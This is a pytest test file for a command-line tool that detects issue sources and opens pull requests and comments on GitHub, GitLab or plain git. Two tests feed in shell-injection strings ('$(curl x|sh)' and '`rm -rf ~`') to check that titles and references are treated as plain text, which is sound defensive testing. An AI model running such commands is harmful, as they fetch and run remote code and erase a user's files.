import json

import pytest

import forge


def run_cli(capsys, *argv):
    code = forge.main(list(argv))
    captured = capsys.readouterr()
    return code, (json.loads(captured.out) if captured.out else None), captured.err


def write(directory, name, text):
    path = directory / name
    path.write_text(text, encoding="utf-8")
    return str(path)


def test_detect_github_issue(commands, capsys, monkeypatch, tmp_path):
    monkeypatch.chdir(tmp_path)
    commands.respond(("git", "remote"), stdout="origin\n")
    commands.respond(("git", "remote", "get-url", "origin"), stdout="git@github.com:a/b.git\n")
    commands.respond(("git", "symbolic-ref"), stdout="origin/main\n")
    code, out, _ = run_cli(capsys, "detect", "--ref-file", write(tmp_path, "ref.txt", "#42\n"))
    assert code == 0
    assert out == {
        "source": "github",
        "target": "github",
        "ref": "42",
        "base": "main",
        "remote": {"host": "github.com", "path": "a/b"},
    }


def test_detect_text_without_remote(commands, capsys, monkeypatch, tmp_path):
    monkeypatch.chdir(tmp_path)
    commands.respond(("git", "remote"), stdout="")
    commands.respond(("git", "branch", "--show-current"), stdout="main\n")
    code, out, _ = run_cli(
        capsys, "detect", "--ref-file", write(tmp_path, "ref.txt", "Add dark mode")
    )
    assert code == 0
    assert out["source"] == "text"
    assert out["target"] == "git"
    assert out["remote"] is None


def test_errors_go_to_stderr_with_exit_1(commands, capsys, monkeypatch, tmp_path):
    monkeypatch.chdir(tmp_path)
    commands.respond(("git", "remote"), stdout="")
    commands.respond(("git", "branch", "--show-current"), stdout="main\n")
    code, out, err = run_cli(capsys, "detect", "--ref-file", write(tmp_path, "ref.txt", "42"))
    assert code == 1
    assert out is None
    assert "needs a GitHub or GitLab remote" in err
    assert "Fix:" in err


def test_fetch_issue_text_writes_issue_md(capsys, monkeypatch, tmp_path):
    monkeypatch.chdir(tmp_path)
    code, out, _ = run_cli(
        capsys,
        "fetch-issue",
        "--source",
        "text",
        "--ref-file",
        write(tmp_path, "ref.txt", "Add dark mode\nPlease."),
        "--root",
        ".devteam",
    )
    assert code == 0
    assert out["id"] == "add-dark-mode"
    written = (tmp_path / ".devteam" / "add-dark-mode" / "issue.md").read_text(encoding="utf-8")
    assert written == "# Add dark mode\n\nPlease.\n"


def test_open_pr_on_plain_git_returns_empty_url(capsys, monkeypatch, tmp_path):
    monkeypatch.chdir(tmp_path)
    (tmp_path / "body.md").write_text("b", encoding="utf-8")
    code, out, _ = run_cli(
        capsys,
        "open-pr",
        "--target",
        "git",
        "--branch",
        "feat/x",
        "--base",
        "main",
        "--title-file",
        write(tmp_path, "title.txt", "T"),
        "--body-file",
        "body.md",
    )
    assert code == 0
    assert out == {"url": "", "number": ""}


def test_comment_on_plain_git_posts_nothing(capsys, monkeypatch, tmp_path):
    monkeypatch.chdir(tmp_path)
    (tmp_path / "c.md").write_text("c", encoding="utf-8")
    code, out, _ = run_cli(capsys, "comment", "--target", "git", "--pr", "", "--body-file", "c.md")
    assert (code, out) == (0, {"posted": False})


def test_comment_on_github_lists_screenshots_locally(commands, capsys, monkeypatch, tmp_path):
    monkeypatch.chdir(tmp_path)
    (tmp_path / "c.md").write_text("QA pass", encoding="utf-8")
    (tmp_path / "shots").mkdir()
    (tmp_path / "shots" / "a.png").write_bytes(b"x")
    (tmp_path / "s.json").write_text(
        json.dumps([{"file": "a.png", "caption": "Card"}]), encoding="utf-8"
    )
    commands.respond(("gh", "pr", "comment"))
    code, out, _ = run_cli(
        capsys,
        "comment",
        "--target",
        "github",
        "--pr",
        "7",
        "--body-file",
        "c.md",
        "--screenshots-json",
        "s.json",
        "--screenshot-dir",
        "shots",
    )
    assert (code, out) == (0, {"posted": True})
    posted_body = commands.calls[0][-1]
    assert "Screenshots (saved locally)" in posted_body
    assert "Card" in posted_body


def test_comment_with_missing_screenshot_posts_nothing(commands, capsys, monkeypatch, tmp_path):
    monkeypatch.chdir(tmp_path)
    (tmp_path / "c.md").write_text("QA", encoding="utf-8")
    (tmp_path / "shots").mkdir()
    (tmp_path / "s.json").write_text(
        json.dumps([{"file": "gone.png", "caption": "x"}]), encoding="utf-8"
    )
    code, _, err = run_cli(
        capsys,
        "comment",
        "--target",
        "gitlab",
        "--pr",
        "3",
        "--body-file",
        "c.md",
        "--screenshots-json",
        "s.json",
        "--screenshot-dir",
        "shots",
    )
    assert code == 1
    assert "gone.png" in err
    assert commands.calls == []


def test_preflight_requires_npx(capsys, monkeypatch, tmp_path):
    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr("devteam_tools.gitinfo.shutil.which", lambda _name: None)
    code, _, err = run_cli(capsys, "preflight", "--source", "text", "--target", "git")
    assert code == 1
    assert "npx is not on PATH" in err


@pytest.mark.parametrize("argv", [["detect"], ["open-pr", "--target", "svn"]])
def test_bad_arguments_exit_2(argv, capsys):
    with pytest.raises(SystemExit) as caught:
        forge.main(argv)
    assert caught.value.code == 2


def test_detect_keeps_shell_metacharacters_as_text(commands, capsys, monkeypatch, tmp_path):
    monkeypatch.chdir(tmp_path)
    commands.respond(("git", "remote"), stdout="")
    commands.respond(("git", "branch", "--show-current"), stdout="main\n")
    text = "`npm test` fails after $(curl x|sh)\n"
    code, out, _ = run_cli(capsys, "detect", "--ref-file", write(tmp_path, "ref.txt", text))
    assert code == 0
    assert out["source"] == "text"
    assert out["ref"] == text.strip()
    assert {call[0] for call in commands.calls} == {"git"}


def test_detect_treats_a_local_path_origin_as_plain_git(commands, capsys, monkeypatch, tmp_path):
    monkeypatch.chdir(tmp_path)
    commands.respond(("git", "remote"), stdout="origin\n")
    commands.respond(("git", "remote", "get-url", "origin"), stdout="/srv/git/r.git\n")
    commands.respond(("git", "symbolic-ref"), stdout="origin/main\n")
    code, out, _ = run_cli(capsys, "detect", "--ref-file", write(tmp_path, "ref.txt", "Fix it"))
    assert code == 0
    assert out["target"] == "git"
    assert out["remote"] is None
    assert out["base"] == "main"


def test_open_pr_passes_the_title_file_verbatim_as_one_argument(
    commands, capsys, monkeypatch, tmp_path
):
    monkeypatch.chdir(tmp_path)
    commands.respond(("gh", "pr", "create"), stdout="https://github.com/a/b/pull/7\n")
    title = "$(curl x|sh) `rm -rf ~`"
    code, out, _ = run_cli(
        capsys,
        "open-pr",
        "--target",
        "github",
        "--branch",
        "feat/7-x",
        "--base",
        "main",
        "--title-file",
        write(tmp_path, "title.txt", title + "\n"),
        "--body-file",
        write(tmp_path, "body.md", "b"),
    )
    assert code == 0
    assert out["number"] == "7"
    assert title in commands.calls[0]
